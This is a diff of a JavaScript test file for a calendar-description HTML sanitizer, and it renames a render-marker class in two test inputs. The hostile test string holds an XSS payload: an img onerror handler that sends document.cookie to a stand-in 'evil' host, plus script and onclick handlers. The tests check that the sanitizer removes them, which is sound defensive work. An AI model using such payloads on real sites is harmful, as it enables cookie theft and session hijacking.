@@ -122,7 +122,7 @@ describe('sanitizeCalendarDescription', () => {
 
   it('removes html-render markers and active content', () => {
     const hostile =
-      '<div class="macro_html_render" data-html-render="true"><img src="x" onerror="fetch(\'//evil/\'+document.cookie)"><template shadowrootmode="open"><script>1</script></template></div><p onclick="steal()">hi</p>';
+      '<div class="rox_html_render" data-html-render="true"><img src="x" onerror="fetch(\'//evil/\'+document.cookie)"><template shadowrootmode="open"><script>1</script></template></div><p onclick="steal()">hi</p>';
     const safe = sanitizeCalendarDescription(hostile);
     expect(safe).toBe('<p>hi</p>');
     expect(safe).not.toMatch(
@@ -222,7 +222,7 @@ describe('exportCalendarDescription', () => {
     setEditorStateFromHtml(
       editor,
       calendarDescriptionToEditorHtml(
-        '<div class="macro_html_render"><img src="x" onerror="1"></div><p>safe</p>'
+        '<div class="rox_html_render"><img src="x" onerror="1"></div><p>safe</p>'
       )
     );
     expect(exportCalendarDescription(editor)).toBe('<p>safe</p>');
